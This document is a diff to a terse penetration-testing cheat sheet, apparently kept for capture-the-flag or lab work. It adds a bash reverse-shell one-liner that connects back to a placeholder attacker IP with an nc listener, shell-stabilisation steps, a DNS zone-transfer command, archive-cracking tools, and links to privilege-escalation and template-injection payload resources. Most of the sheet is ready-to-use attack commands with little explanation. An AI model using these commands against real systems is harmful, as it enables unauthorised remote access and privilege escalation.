@@ -1,15 +1,33 @@
+dig axfr <hostname> @<hostip>                         # DNS zone trans
+
+python3 -m http.server 8000                           # strat simple python3 server on 8000 port
 python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
 zip2john \ rar2john                                   # crack archives  via johntheripepr
 
 
-bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"      # revers bash via "nc -lvnp 443"
-###make bash interactive##
+bash -c "bash -i >& /dev/tcp/{your_IP}/9001 0>&1"      # revers bash via "nc -lvnp 9001"
+
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys  #interactive bash fully TTY
+###make bash interactive###########################################################
 python3 -c 'import pty;pty.spawn("/bin/bash")'        # shell via python
 CTRL+Z
 stty raw -echo
 fg
 export TERM=xterm
 
-№№№№№№№№№№№№№№№№№№№№№№№№№№№№№№
+####################################################################################
+script -qc /bin/bash /dev/null
+(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+####################################################################################
+
+
 
 sudo -l                                               # check aviable commands
+
+
+https://gtfobins.github.io/                           # bypass local security restrictions in Linux
+
+
+https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection   #SSTi inj
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection 
